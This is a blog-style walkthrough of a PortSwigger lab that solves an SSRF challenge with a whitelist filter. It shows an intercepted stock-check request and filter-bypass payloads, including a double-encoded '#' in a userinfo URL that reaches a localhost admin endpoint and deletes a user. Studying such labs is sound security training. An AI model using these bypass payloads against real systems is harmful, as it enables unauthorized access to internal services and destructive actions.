---
title: "SSRF: challange 4"
date: "2024-02-09"
thumbnail: "/assets/img/thumbnail/ssrf.png"
---

# SSRF with whitelist-based input filter
---

Link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.

### solution

- start the lab and remember the objective is to open `/admin` and delete the user carlos
- if u try going to `/admin` endpoint, you will n't get the result as u can't access it directly u will get this message `Admin interface only available if logged in as an administrator, or if requested from loopback`
- so let's go to products and click check stock as challange describtion said
- intercept this request

```
POST /product/stock HTTP/2
Host: 0a0d0067037080968141b6080065004b.web-security-academy.net
Cookie: session=h74HgBoArcl80JrdU0IBbH5Edvr3JI69
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0d0067037080968141b6080065004b.web-security-academy.net/product?productId=3
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a0d0067037080968141b6080065004b.web-security-academy.net
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1
```

- notice that stockApi parameter has a url as a value, so let's try to change it to `http://localhost/admin` and the send the request
- ummmmmmmmmmm it's blocked and also all the trials like `http://127.1`
- let's try this `http://localhost@stock.weliketoshop.net/`
- this gives "Internal Server Error" response.
- after appending # to localhost the url is rejected so let's try double URL encoding the # to be `%2523`
- then the stockApi parameter became `http://localhost%2523@stock.weliketoshop.net/` and the status code of the response became 200
- let's delete carlos using `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`
- congratzzzzzzzzzzzzzzzzzz